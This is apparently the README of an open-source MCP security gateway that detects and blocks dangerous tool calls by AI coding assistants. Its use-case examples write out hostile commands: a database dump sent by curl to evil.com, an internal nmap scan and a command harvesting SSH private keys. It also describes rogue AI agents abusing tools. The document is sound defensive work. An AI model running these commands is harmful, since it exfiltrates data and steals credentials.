# Proxilion MCP Security Gateway

Real-time threat detection for AI coding assistants. Prevents insider threats, compromised accounts, and rogue AI agents from weaponizing Claude Code, GitHub Copilot, Cursor, and Windsurf.

**Detection Rate**: 75-85% against sophisticated attacks (GTG-1002-class)  
**Latency**: <50ms P95  
**Deployment**: Self-hosted, Docker-ready

---

## Quick Start

### Docker Deployment (Recommended)

```bash
git clone https://github.com/clay-good/proxilion
cd proxilion

# Start in monitor mode (logs only, never blocks)
docker compose up -d

# Test threat detection
./demo.sh

# Expected output:
# ✓ Safe commands allowed (ls -la)
# ✓ Network scanning blocked (nmap → score 100, TERMINATE)
# ✓ Credential theft prevented (.env → score 86, BLOCK)
# ✓ SSH key harvesting blocked (id_rsa → score 100, TERMINATE)
```

**Access Points**:
- Gateway API: `http://localhost:8787`
- Health check: `curl http://localhost:8787/health`
- Metrics: `http://localhost:8787/metrics`

### Build from Source

```bash
# Build
cargo build --release

# Run in monitor mode
SESSION_STORE=inmemory MODE=monitor ./target/release/proxilion-gateway

# Run in block mode (production)
SESSION_STORE=redis REDIS_URL=redis://localhost:6379 MODE=block ./target/release/proxilion-gateway
```

### Enable Monitoring (Grafana + Prometheus)

```bash
docker compose --profile monitoring up -d
```

- Grafana: `http://localhost:3001` (admin/admin)
- Prometheus: `http://localhost:9090`

---

## How It Works

```
AI Assistant (Claude Code, Copilot)
        ↓
Proxilion Gateway (<50ms analysis)
        ↓
Decision: Allow | Alert | Block | Terminate
        ↓
Tool Execution (MCP Server)
```

**25 Threat Analyzers** running in parallel:
- **Pattern-based** (15): Hacking tools, credential access, exfiltration, enumeration
- **Session-aware** (5): Multi-phase attack progression, request rate, correlation
- **Semantic** (5): Social engineering, AI autonomy, conversation analysis

---

## Detection Coverage

| Threat Type | Detection Rate | Examples |
|-------------|----------------|----------|
| Network Reconnaissance | 95-100% | nmap, masscan, port scanning |
| Credential Harvesting | 90-95% | SSH keys, .env files, AWS credentials |
| Data Exfiltration | 85-90% | Large transfers, pastebin uploads, curl to external IPs |
| Multi-Phase Attacks | 85-90% | Session tracking: recon → access → exfil |
| Social Engineering | 70-80% | Requires conversation context + Claude API |
| **Overall (GTG-1002-class)** | **75-85%** | In controlled testing |

---

## Use Cases

### Prevent Insider Threats
Employee attempts database exfiltration:
```bash
pg_dump production_db | curl -F "file=@-" https://evil.com/upload
```
**Proxilion**: BLOCKED (score 92) - Exfiltration + unauthorized endpoint

### Detect Compromised Accounts
Attacker scans internal network:
```bash
nmap -sV 10.0.0.0/24
```
**Proxilion**: BLOCKED (score 88) - Reconnaissance tool + internal network

### Control Rogue AI Agents
AI agent harvests SSH keys:
```bash
find /home -name "id_rsa" -exec cat {} \;
```
**Proxilion**: BLOCKED (score 86) - Credential harvesting + bulk access

---

## Configuration

### Environment Variables

```bash
# Core settings
MODE=monitor                # monitor | alert | block | terminate
SESSION_STORE=redis         # inmemory | redis
REDIS_URL=redis://localhost:6379

# Thresholds
ALERT_THRESHOLD=50          # Log + alert
BLOCK_THRESHOLD=70          # Prevent execution
TERMINATE_THRESHOLD=90      # Kill entire session

# Optional: Semantic analysis (social engineering detection)
ENABLE_SEMANTIC_ANALYSIS=false
ANTHROPIC_API_KEY=sk-ant-xxx  # Required if enabled
```

### Operational Modes

| Mode | Behavior | Use Case |
|------|----------|----------|
| `monitor` | Log all threats, never block | Baseline collection, testing |
| `alert` | Log + alert on scores ≥50 | Staging environments |
| `block` | Block requests with scores ≥70 | Production (recommended) |
| `terminate` | Block ≥70, terminate session ≥90 | High-security environments |

---

## Integration

### TypeScript/JavaScript

```bash
npm install @proxilion/mcp-middleware
```

```typescript
import { ProxilionMCPClient } from '@proxilion/mcp-middleware';

const client = new ProxilionMCPClient({
  proxilionEndpoint: 'http://localhost:8787',
  userId: 'user@company.com',
  mode: 'block',
});

// Track conversation for social engineering detection
client.addConversationTurn(userMessage, aiResponse);

// Execute with security analysis
const result = await client.callToolWithAnalysis(toolCall, executeFunc);
```

### Python

```bash
pip install proxilion-mcp
```

```python
from proxilion_mcp import ProxilionMCPClient, ProxilionConfig

client = ProxilionMCPClient(ProxilionConfig(
    proxilion_endpoint="http://localhost:8787",
    user_id="user@company.com",
    mode="block",
))

result = await client.call_tool_with_analysis(tool_call, execute_func)
```

See [examples/](examples/) for complete integration examples.

---

## API Reference

### POST /analyze

Analyze a tool call for threats.

**Request**:
```json
{
  "tool_call": {
    "Bash": {
      "command": "nmap -sV target.com",
      "args": [],
      "env": {}
    }
  },
  "user_id": "user@company.com",
  "session_id": "session_123",
  "user_message": "Can you scan the network?",
  "ai_response": "I'll run nmap to scan"
}
```

**Response**:
```json
{
  "decision": "Block",
  "threat_score": 95.0,
  "patterns_detected": [
    "nmap reconnaissance tool detected",
    "Port scanning flags detected",
    "Network scanner detected"
  ],
  "analyzer_scores": {
    "hacking_tools": 85.0,
    "enumeration": 75.0
  },
  "session_terminated": false
}
```

**Status Codes**:
- `200 OK` - Analysis complete (Allow/Alert)
- `403 Forbidden` - Blocked or Terminated
- `500 Internal Server Error` - Gateway error

---

## Architecture

**Why Rust?**
1. Memory safety (gateway can't become attack vector)
2. <50ms P95 latency (zero-cost abstractions, no GC pauses)
3. Single binary deployment (no dependencies)
4. 10,000+ req/sec throughput per instance
5. Production-grade reliability

**Why MCP Layer?**
- Universal coverage (works with any MCP-compatible AI tool)
- Pre-execution analysis (block before damage)
- Conversation context (detect social engineering)
- Session correlation (track multi-phase attacks)

**Components**:
- **Gateway** (`crates/gateway`) - HTTP API, request routing
- **Threat Engine** (`crates/threat-engine`) - 25 analyzers, scoring
- **Session State** (`crates/session-state`) - Redis + in-memory correlation
- **MCP Protocol** (`crates/mcp-protocol`) - Tool call parsing

See [ARCHITECTURE.md](ARCHITECTURE.md) for technical deep dive.

---

## Limitations

**This is not a silver bullet.** Use as one layer in defense-in-depth.

**Architectural Constraints**:
- MCP-layer only (cannot see AI planning above tool execution)
- Pattern-based limits (novel attacks may evade)
- Requires persistent session IDs from clients
- False positives possible (requires tuning)

**What We Miss**:
- Strategic planning before first tool call
- Attacks fragmented into 50+ micro-requests over months
- Non-MCP AI systems
- Direct network attacks (only analyzes tool calls)

See [ARCHITECTURAL_LIMITATIONS.md](ARCHITECTURAL_LIMITATIONS.md) for complete analysis.

---

## Security

**Deploy behind authentication.** Proxilion does not implement authentication - it relies on upstream systems (API gateway, reverse proxy) to verify user identity.

**Recommended Architecture**:
```
Client (with auth token)
    ↓
API Gateway / Reverse Proxy (OAuth, API key)
    ↓
Proxilion Gateway (threat analysis)
    ↓
MCP Server (tool execution)
```

**Best Practices**:
- Network isolation (private VPC, security groups)
- TLS/SSL in production
- Secrets management (AWS Secrets Manager, Vault)
- Redis authentication (requirepass, SSL/TLS)
- Resource limits (Docker memory/CPU)

See [SECURITY.md](SECURITY.md) for vulnerability reporting and detailed guidance.

---

## Deployment Guides

- **Quick Start** - [QUICK_START.md](QUICK_START.md) - 5-minute deployment
- **Platform-Specific** - [DEPLOYMENT_GUIDES.md](DEPLOYMENT_GUIDES.md) - GitHub, Anthropic, Microsoft integrations
- **Architecture** - [ARCHITECTURE.md](ARCHITECTURE.md) - System design and technical decisions
- **Security** - [SECURITY.md](SECURITY.md) - Vulnerability reporting and best practices
- **API Reference** - [API_REFERENCE.md](API_REFERENCE.md) - Complete API documentation

---

## Testing

```bash
# Run all tests (160 tests, 100% pass rate)
cargo test

# Run demo
./demo.sh
```

---

## Production Checklist

Before deploying to production:

- [ ] Run in monitor mode for 1+ week
- [ ] Review false positive rate (target: <5%)
- [ ] Configure Redis for session persistence
- [ ] Set up Prometheus + Grafana monitoring
- [ ] Configure alerts for high threat scores
- [ ] Deploy behind authentication layer
- [ ] Enable TLS/SSL
- [ ] Test fail-open vs fail-closed behavior

---

## License

MIT License - Use, modify, and deploy freely.

---

## Built With

- Rust 1.70+ (memory safety, performance)
- Tokio (async runtime)
- Axum (HTTP framework)
- Redis (session correlation)
- Prometheus + Grafana (monitoring)
- Docker (deployment)

160 tests passing. Production-ready.
